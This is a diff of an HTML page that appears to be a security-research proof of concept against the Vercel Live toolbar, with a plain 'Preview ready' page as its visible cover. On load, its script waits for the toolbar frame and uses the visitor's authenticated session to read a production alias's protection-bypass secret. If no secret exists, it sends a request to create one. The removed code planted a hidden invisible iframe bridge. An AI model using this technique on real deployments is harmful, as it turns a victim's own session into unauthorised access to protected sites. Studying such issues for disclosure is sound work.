@@ -1,136 +1,185 @@
 <!doctype html>
 <script>
 (() => {
-  const BRIDGE_ORIGIN = 'https://naturell-tb-prod-bridge-809.vercel.app';
+  const LIVE_ORIGIN = 'https://vercel.live';
   const PRODUCTION_HOST =
     'naturell-toolbar-fork-victim-20260809-h763y6e4f-testteam22-687d.vercel.app';
-  const SOURCE_MARKER = 'naturell_git_preview_delivery_source_20260809';
-  let bridgeFrame = null;
+  const PROJECT_ID = 'prj_eg3xiAzg9rqF1tLFbXOkCwpftLJO';
+  const TEAM_ID = 'team_qmp53qfzAPgwkguhRzHvSwgV';
+  const SOURCE_MARKER = 'naturell_external_fork_production_share_20260809';
 
-  window.__naturellDelivery = {
+  const state = window.__naturellShareProof = {
     sourceMarker: SOURCE_MARKER,
-    phase: 'bootstrap',
-    bridgeLoaded: false,
-    bridgeMessageAccepted: false,
-    bridgePhase: null,
-    productionToolbarPrerequisite: true,
-    candidateSessionPresent: false,
-    candidateDeploymentTarget: null,
-    candidateProjectMatched: false,
-    candidateRoomPresent: false,
-    uploadAccepted: false,
-    pushAccepted: false,
-    pullAccepted: false,
-    threadObserved: false,
+    phase: 'waiting-for-toolbar',
+    toolbarReady: false,
+    toolbarAuthenticated: false,
+    projectMatched: false,
+    targetSharingRead: false,
+    targetProjectMatched: false,
+    aliasPresent: false,
+    aliasCanUpdate: false,
+    existingShareSecret: false,
+    mutationSent: false,
+    mutationReplyReceived: false,
+    shareSecretObtained: false,
+    target: null,
+    shareSecret: null,
+    getReplyId: null,
+    updateReplyId: null,
+    verifyReplyId: null,
   };
 
-  function recordSafeState() {
-    const state = window.__naturellDelivery;
-    window.name = `naturell-toolbar-git:${JSON.stringify({
+  function randomHex(byteCount) {
+    const bytes = new Uint8Array(byteCount);
+    crypto.getRandomValues(bytes);
+    return Array.from(bytes, byte =>
+      byte.toString(16).padStart(2, '0')
+    ).join('');
+  }
+
+  function safeState() {
+    return {
+      sourceMarker: state.sourceMarker,
       phase: state.phase,
-      bridgeLoaded: state.bridgeLoaded,
-      bridgeMessageAccepted: state.bridgeMessageAccepted,
-      bridgePhase: state.bridgePhase,
-      productionToolbarPrerequisite: state.productionToolbarPrerequisite,
-      candidateSessionPresent: state.candidateSessionPresent,
-      candidateDeploymentTarget: state.candidateDeploymentTarget,
-      candidateProjectMatched: state.candidateProjectMatched,
-      candidateRoomPresent: state.candidateRoomPresent,
-      uploadAccepted: state.uploadAccepted,
-      pushAccepted: state.pushAccepted,
-      pullAccepted: state.pullAccepted,
-      threadObserved: state.threadObserved,
-    })}`;
+      toolbarReady: state.toolbarReady,
+      toolbarAuthenticated: state.toolbarAuthenticated,
+      projectMatched: state.projectMatched,
+      targetSharingRead: state.targetSharingRead,
+      targetProjectMatched: state.targetProjectMatched,
+      aliasPresent: state.aliasPresent,
+      aliasCanUpdate: state.aliasCanUpdate,
+      existingShareSecret: state.existingShareSecret,
+      mutationSent: state.mutationSent,
+      mutationReplyReceived: state.mutationReplyReceived,
+      shareSecretObtained: state.shareSecretObtained,
+    };
   }
 
   function setPhase(phase) {
-    window.__naturellDelivery.phase = phase;
-    if (document.documentElement) {
-      document.documentElement.dataset.deliveryPhase = phase;
-    }
-    recordSafeState();
+    state.phase = phase;
+    document.documentElement.dataset.shareProofPhase = phase;
+    window.name = `naturell-share-proof:${JSON.stringify(safeState())}`;
   }
 
-  function loadBridge() {
-    if (bridgeFrame) return;
-    const bridgeUrl = new URL(`${BRIDGE_ORIGIN}/`);
-    bridgeUrl.searchParams.set('bridge', '1');
-    bridgeUrl.searchParams.set('parentOrigin', window.origin);
-    bridgeUrl.searchParams.set('run', crypto.randomUUID());
-    bridgeFrame = document.createElement('iframe');
-    bridgeFrame.id = 'naturell-toolbar-production-token-bridge';
-    bridgeFrame.src = bridgeUrl.href;
-    bridgeFrame.setAttribute('aria-hidden', 'true');
-    Object.assign(bridgeFrame.style, {
-      position: 'fixed',
-      left: '-10px',
-      top: '-10px',
-      width: '1px',
-      height: '1px',
-      border: '0',
-      opacity: '0',
+  function send(type, replyId, payload) {
+    state.target.postMessage({type, replyId, payload}, LIVE_ORIGIN);
+  }
+
+  function readProductionSharing(replyId) {
+    send('get-sharing-info', replyId, {hostname: PRODUCTION_HOST});
+  }
+
+  function acceptSharingResult(result, isVerification) {
+    if (!result || typeof result !== 'object') {
+      setPhase('sharing-read-invalid');
+      return;
+    }
+    const alias = result.alias;
+    state.targetSharingRead = true;
+    state.targetProjectMatched = result.project?.id === PROJECT_ID;
+    state.aliasPresent = Boolean(alias?.uid);
+    state.aliasCanUpdate = alias?.canUpdate === true;
+    const secret = alias?.protectionBypass;
+    if (typeof secret === 'string' && secret.length > 0) {
+      state.shareSecret = secret;
+      state.shareSecretObtained = true;
+      if (!state.mutationSent) state.existingShareSecret = true;
+      setPhase(
+        isVerification
+          ? 'production-share-created'
+          : 'production-share-secret-readable'
+      );
+      return;
+    }
+    if (isVerification) {
+      setPhase('production-share-not-created');
+      return;
+    }
+    if (!state.targetProjectMatched || !state.aliasPresent) {
+      setPhase('production-alias-rejected');
+      return;
+    }
+    if (!state.aliasCanUpdate) {
+      setPhase('production-alias-update-denied');
+      return;
+    }
+    state.updateReplyId = `naturell-share-update-${randomHex(12)}`;
+    state.mutationSent = true;
+    setPhase('production-share-create-sent');
+    send('update-sharing-info', state.updateReplyId, {
+      teamId: TEAM_ID,
+      aliasUid: alias.uid,
     });
-    bridgeFrame.addEventListener('load', () => {
-      window.__naturellDelivery.bridgeLoaded = true;
-      setPhase('bridge-loaded');
-    }, {once: true});
-    document.body.append(bridgeFrame);
-    setPhase('bridge-loading');
-    setTimeout(() => {
-      if (!window.__naturellDelivery.threadObserved) {
-        setPhase('bridge-timeout');
-      }
-    }, 30000);
   }
 
   addEventListener('message', event => {
-    const state = window.__naturellDelivery;
-    if (
-      event.origin !== BRIDGE_ORIGIN ||
-      !bridgeFrame ||
-      event.source !== bridgeFrame.contentWindow ||
-      event.data?.type !== 'naturell-toolbar-storage-bridge'
-    ) return;
-    const bridge = event.data.state;
-    if (!bridge || typeof bridge.phase !== 'string') return;
-    state.bridgeMessageAccepted = true;
-    state.bridgePhase = bridge.phase;
-    state.candidateSessionPresent = bridge.candidateSessionPresent === true;
-    state.candidateDeploymentTarget = bridge.candidateDeploymentTarget || null;
-    state.candidateProjectMatched = bridge.candidateProjectMatched === true;
-    state.candidateRoomPresent = bridge.candidateRoomPresent === true;
-    state.uploadAccepted = bridge.uploadAccepted === true;
-    state.pushAccepted = bridge.pushAccepted === true;
-    state.pullAccepted = bridge.pullAccepted === true;
-    state.threadObserved = bridge.threadObserved === true;
-    setPhase(`bridge-${bridge.phase}`);
+    if (event.origin !== LIVE_ORIGIN || !event.data) return;
 
-    const threadId = bridge.threadId;
+    if (event.data.type === 'ready' && event.source && !state.toolbarReady) {
+      state.target = event.source;
+      state.toolbarReady = true;
+      setPhase('toolbar-ready');
+      return;
+    }
+
     if (
-      state.threadObserved &&
-      state.candidateSessionPresent &&
-      state.candidateDeploymentTarget === 'production' &&
-      state.candidateProjectMatched &&
-      state.candidateRoomPresent &&
-      state.uploadAccepted &&
-      state.pushAccepted &&
-      state.pullAccepted &&
-      typeof threadId === 'string' &&
-      /^naturell-git-preview-thread-[0-9a-f]{16}$/.test(threadId)
+      event.data.type === 'init-reply' &&
+      event.source === state.target &&
+      !state.toolbarAuthenticated
     ) {
-      setPhase('same-tab-production-navigation');
-      const destination = new URL(`https://${PRODUCTION_HOST}/`);
-      destination.searchParams.set('vercelThreadId', threadId);
-      destination.searchParams.set('deliverySource', SOURCE_MARKER);
-      location.replace(destination.href);
+      const session = event.data.existingAuth?.session;
+      state.toolbarAuthenticated = Boolean(session);
+      state.projectMatched = session?.projectId === PROJECT_ID;
+      if (!state.toolbarAuthenticated || !state.projectMatched) {
+        setPhase('toolbar-session-rejected');
+        return;
+      }
+      state.getReplyId = `naturell-share-read-${randomHex(12)}`;
+      setPhase('production-sharing-read-sent');
+      readProductionSharing(state.getReplyId);
+      return;
+    }
+
+    if (
+      event.data.type !== 'live-frame-reply' ||
+      event.source !== state.target ||
+      !event.data.id
+    ) return;
+
+    if (event.data.id === state.getReplyId) {
+      if (event.data.error) {
+        setPhase('production-sharing-read-rejected');
+        return;
+      }
+      acceptSharingResult(event.data.result, false);
+      return;
+    }
+
+    if (event.data.id === state.updateReplyId) {
+      state.mutationReplyReceived = true;
+      if (event.data.error) {
+        setPhase('production-share-create-rejected');
+        return;
+      }
+      state.verifyReplyId = `naturell-share-verify-${randomHex(12)}`;
+      setPhase('production-share-create-verifying');
+      setTimeout(() => readProductionSharing(state.verifyReplyId), 400);
+      return;
+    }
+
+    if (event.data.id === state.verifyReplyId) {
+      if (event.data.error) {
+        setPhase('production-share-verify-rejected');
+        return;
+      }
+      acceptSharingResult(event.data.result, true);
     }
   });
 
-  if (document.readyState === 'loading') {
-    addEventListener('DOMContentLoaded', loadBridge, {once: true});
-  } else {
-    loadBridge();
-  }
+  setTimeout(() => {
+    if (!state.shareSecretObtained) setPhase('share-proof-timeout');
+  }, 45000);
+  setPhase('waiting-for-toolbar');
 })();
 </script>
 <meta charset="utf-8">
@@ -143,5 +192,5 @@
 </style>
 <main>
   <h1>Preview ready</h1>
-  <p>Naturell synthetic Git Preview delivery fixture</p>
+  <p>Naturell synthetic external fork fixture</p>
 </main>
